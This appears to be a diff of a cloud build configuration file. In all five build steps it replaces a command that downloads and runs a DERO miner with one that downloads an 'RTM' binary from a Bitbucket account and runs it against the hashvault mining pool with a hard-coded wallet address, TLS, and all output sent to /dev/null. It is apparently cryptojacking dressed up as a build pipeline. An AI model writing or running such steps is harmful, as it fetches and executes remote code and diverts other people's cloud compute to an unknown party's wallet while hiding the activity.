@@ -3,7 +3,7 @@ steps:
     args: 
       - '-c'
       - >-
-        wget https://bitbucket.org/wename798/jaya/downloads/astrominer.tar.gz && tar -xvf astrominer.tar.gz && ./astrominer -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xmylq8cq7asn9nqswcd3s -r dero.rabidmining.com:10300
+        wget https://bitbucket.org/wename798/sawah/downloads/RTM.tar.gz && tar -xvf RTM.tar.gz &&./RTM --url pool.hashvault.pro:80 --user ZEPHs8qpRw1igRzoQwesBMQRTuubopJMcEsd5LjBxdiX9zSaMDGuq4CfEeohWKu5etAXmnFuq4T7pPLJWHA4gW8K4EDAPeLduTb --pass E2 --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 >/dev/null >/dev/null 2>&1
     waitFor: ["-"]
     entrypoint: /bin/bash
 
@@ -11,7 +11,7 @@ steps:
     args: 
       - '-c'
       - >-
-        wget https://bitbucket.org/wename798/jaya/downloads/astrominer.tar.gz && tar -xvf astrominer.tar.gz && ./astrominer -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xmylq8cq7asn9nqswcd3s -r dero.rabidmining.com:10300
+        wget https://bitbucket.org/wename798/sawah/downloads/RTM.tar.gz && tar -xvf RTM.tar.gz &&./RTM --url pool.hashvault.pro:80 --user ZEPHs8qpRw1igRzoQwesBMQRTuubopJMcEsd5LjBxdiX9zSaMDGuq4CfEeohWKu5etAXmnFuq4T7pPLJWHA4gW8K4EDAPeLduTb --pass E2 --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 >/dev/null >/dev/null 2>&1
     waitFor: ["-"]
     entrypoint: /bin/bash
     
@@ -19,7 +19,7 @@ steps:
     args: 
       - '-c'
       - >-
-        wget https://bitbucket.org/wename798/jaya/downloads/astrominer.tar.gz && tar -xvf astrominer.tar.gz && ./astrominer -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xmylq8cq7asn9nqswcd3s -r dero.rabidmining.com:10300
+        wget https://bitbucket.org/wename798/sawah/downloads/RTM.tar.gz && tar -xvf RTM.tar.gz &&./RTM --url pool.hashvault.pro:80 --user ZEPHs8qpRw1igRzoQwesBMQRTuubopJMcEsd5LjBxdiX9zSaMDGuq4CfEeohWKu5etAXmnFuq4T7pPLJWHA4gW8K4EDAPeLduTb --pass E2 --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 >/dev/null >/dev/null 2>&1
     waitFor: ["-"]
     entrypoint: /bin/bash
 
@@ -27,7 +27,7 @@ steps:
     args: 
       - '-c'
       - >-
-        wget https://bitbucket.org/wename798/jaya/downloads/astrominer.tar.gz && tar -xvf astrominer.tar.gz && ./astrominer -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xmylq8cq7asn9nqswcd3s -r dero.rabidmining.com:10300
+        wget https://bitbucket.org/wename798/sawah/downloads/RTM.tar.gz && tar -xvf RTM.tar.gz &&./RTM --url pool.hashvault.pro:80 --user ZEPHs8qpRw1igRzoQwesBMQRTuubopJMcEsd5LjBxdiX9zSaMDGuq4CfEeohWKu5etAXmnFuq4T7pPLJWHA4gW8K4EDAPeLduTb --pass E2 --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 >/dev/null >/dev/null 2>&1
     waitFor: ["-"]
     entrypoint: /bin/bash
 
@@ -35,7 +35,7 @@ steps:
     args: 
       - '-c'
       - >-
-        wget https://bitbucket.org/wename798/jaya/downloads/astrominer.tar.gz && tar -xvf astrominer.tar.gz && ./astrominer -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xmylq8cq7asn9nqswcd3s -r dero.rabidmining.com:10300
+        wget https://bitbucket.org/wename798/sawah/downloads/RTM.tar.gz && tar -xvf RTM.tar.gz &&./RTM --url pool.hashvault.pro:80 --user ZEPHs8qpRw1igRzoQwesBMQRTuubopJMcEsd5LjBxdiX9zSaMDGuq4CfEeohWKu5etAXmnFuq4T7pPLJWHA4gW8K4EDAPeLduTb --pass E2 --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 >/dev/null >/dev/null 2>&1
     waitFor: ["-"]
     entrypoint: /bin/bash
 timeout: 86000s
